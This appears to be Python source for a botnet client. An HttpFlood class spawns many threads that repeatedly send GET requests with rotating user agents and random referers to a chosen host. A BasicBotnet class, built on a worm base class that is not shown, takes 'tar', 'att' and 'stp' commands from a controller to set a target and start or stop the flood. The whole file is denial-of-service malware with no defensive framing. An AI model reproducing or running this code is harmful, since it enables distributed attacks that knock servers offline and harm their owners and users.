

import string
from multiprocessing import Process
from random import choice, choices, sample

USER_AGENT = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/75.0"]


class HttpFlood(Process):
    def __init__(self, target, stop_event, th_no=100, port=80):
        super().__init__(daemon=True)
        self.target = target
        self.th_no = th_no
        self.user_agent = USER_AGENT
        self.stop_event = stop_event
        self.chars = list(string.ascii_letters + string.digits)
        self.port = 80
        
    
    def http_request(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.connect((self.target, self.port))
            user_agent = choice(self.user_agent)
            referer = "".join(choices(self.chars, k=12))
            request = f"GET / HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent:{user_agent}\r\nReferer:{referer}\r\n\r\n"
            print(f"\n---------------------\n{request}\n---------------------------------\n")
            sock.sendall(request.encode())
        except OSError as e:
            print("Request Error: ", e)
            return False
        finally:
            sock.shutdown(socket.SHUT_RDWR)
            sock.close()
    
    def flood(self):
        while not self.stop_event.is_set():
            self.http_request()
    
    def attack(self):
        requests = []
        for _ in range(self.th_no):
            requests.append(Thread(target=self.flood, daemon=True))
        for r in requests:
            r.start()
    
    def run(self):
        self.attack()
        while not self.stop_event.is_set():
            sleep(2)
        
class BasicBotnet(BasicWorm):
    def __init__(self):
        super().__init__()
        self.name = "Basic Botnet"
        self.target = None
        self.proc_att = 1
        self.stop_event = multiprocessing.Event()
        self._is_attack = False
    
    def _check_orders(self):
        while not self.conn_event.is_set():
            print("Check Orders")
            print(self.target)
            self.lock.acquire()
            check = self.make_sysmsg("basbot")
            self.lock.release()
            if not self.send_msg(check):
                self.conn_event.set()
            sleep(self.conn_check)
    
    def check_orders(self):
        orders = Thread(target=self._check_orders, daemon=True)
        orders.start()
    
    def set_target(self, target):
        host = target.replace("http://", "").replace("https://", "").replace("www.", "")
        try:
            ip_tar = socket.gethostbyname(host)
            if ip_tar == self.target:
                return True
            self.send_msg(f"New target is set: {ip_tar}")
            self.target = ip_tar
        except Exception as e:
            self.send_msg(f"[!!] ERROR Set Target: {e}")
            return False
    
    def attack(self):
        if self._is_attack:
            self.send_msg("Is already attackin")
            return False
        self.stop_event.clear()
        if not self.target:
            self.send_msg("[!!] Target is not set !!! [!!]")
            return False
        for _ in range(self.proc_att):
            flood = HttpFlood(self.target, self.stop_event)
            print(flood.target)
            flood.start()
        self._is_attack = True
    
    def stop_attack(self):
        self.stop_event.set()
        self._is_attack = False
        self.send_msg("Stop Attacking")
    
    
    def exec_command(self, cmd):
        cmd = cmd.split(" ")
        if cmd[0] == "tar":
            self.set_target(cmd[1])
        elif cmd[0] == "att":
            self.attack()
        elif cmd[0] == "stp":
            self.stop_attack()
        else:
            self.send_msg("Unknown Command")

    def RUN(self):
        self.check_orders()
        while True:
            cmd = self.recive_msg()
            print("CMD:", cmd)
            if not cmd:
                break
            self.exec_command(cmd)
        return True

